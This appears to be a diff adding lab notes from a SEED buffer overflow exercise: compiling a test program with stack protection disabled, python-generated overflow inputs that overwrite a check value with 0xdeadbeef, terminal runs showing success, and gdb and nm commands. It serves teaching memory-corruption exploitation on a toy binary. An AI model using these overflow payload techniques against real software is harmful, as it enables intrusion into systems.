@@ -1,0 +1,27 @@
+gcc -m32 -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2 -w
+
+python -c "print('A'*40+'\xef\xbe\xad\xde')" > inputbofq2
+
+seed@03a6a11aa9a8:~/seclabs/bof$ python -c "print('A'*41+'\xef\xbe\xad\xde')" > inputbof2
+seed@03a6a11aa9a8:~/seclabs/bof$ python -c "print('A'*40+'\xef\xbe\xad\xde')" > inputbof2
+===============================1==========
+seed@29658660fa5b:~/seclabs/bof$ ./bof2.out < inputbof2
+[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ
+[check] 0xadbeef41
+
+You are on the right way!
+===============================2==========
+seed@29658660fa5b:~/seclabs/bof$ ./bof2.out < inputbof2
+
+[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+[check] 0xdeadbeef
+Yeah! You win!
+
+======================================================
+$(python -c "print('A'*40+'\xef\xbe\xad\xde')")
+
+gdb bof2.out -q
+
+disas main
+
+nm bof2.out | grep namefunc
